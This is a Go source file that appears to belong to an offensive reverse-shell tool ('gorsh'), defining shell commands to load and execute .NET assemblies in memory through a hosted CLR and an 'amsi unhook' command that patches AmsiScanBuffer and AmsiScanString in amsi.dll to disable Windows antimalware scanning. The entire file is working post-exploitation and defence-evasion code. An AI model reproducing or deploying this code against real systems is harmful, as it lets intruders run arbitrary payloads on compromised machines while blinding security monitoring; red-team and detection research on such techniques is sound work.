package cmds

import (
	"fmt"
	"os"

	"github.com/audibleblink/gorsh/internal/execute_assembly"

	"github.com/abiosoft/ishell"
)

var (
	clr      = execute_assembly.CLR{}
	hostname string
)

func UnloadAssembly(c *ishell.Context) {
	clr.Active = ""
	ResetPrompt(c)
}

func LoadAssembly(c *ishell.Context) {
	if len(c.Args) != 1 {
		c.Println("must provide assembly name to load")
		return
	}

	name := c.Args[0]

	var err error
	if clr == (execute_assembly.CLR{}) {
		clr, err = execute_assembly.NewCLR()
		if err != nil {
			c.Printf("could not load clr: %v\n", err)
			return
		}
	}

	err = clr.Load(name)
	if err != nil {
		c.Printf("could not load %s: %s\n", name, err)
		return
	}

	ChangePrompt(c, name)
}

func ExecuteAssembly(c *ishell.Context) {
	if clr.Active == "" {
		c.Println("no assembly is currently loaded")
		return
	}
	stdout, stderr := clr.Execute(c.Args)
	c.Println(stdout)
	c.Println(stderr)
}

func ResetPrompt(c *ishell.Context) {
	c.SetPrompt(fmt.Sprintf("[%s]> ", GetHostname()))
}

func ChangePrompt(c *ishell.Context, module string) {
	c.SetPrompt(fmt.Sprintf("[%s] %s > ", GetHostname(), module))
}

func Amsi(c *ishell.Context) {
	unhook := false
	if len(c.Args) > 0 && c.Args[0] == "unhook" {
		unhook = true
	}

	hasAmsi, err := execute_assembly.HasAmsi()
	if err != nil {
		c.Printf("failed to check for amsi: %v\n", err)
		return
	}

	if !hasAmsi {
		c.Println("amsi not detected")
		return
	} else {
		c.Println("amsi detected")
	}

	if unhook {
		fns := []string{
			"AmsiScanBuffer",
			"AmsiScanString",
		}

		for _, fn := range fns {
			dll, err := execute_assembly.UnhookFunction("amsi.dll", fn)
			if err != nil {
				c.Printf("failed to unhook %s: %v\n", fn, err)
				return
			}
			c.Printf(
				"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
				fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress)
		}
	}
}

func GetHostname() string {
	if hostname != "" {
		return hostname
	}
	hostname, _ = os.Hostname()
	return hostname
}
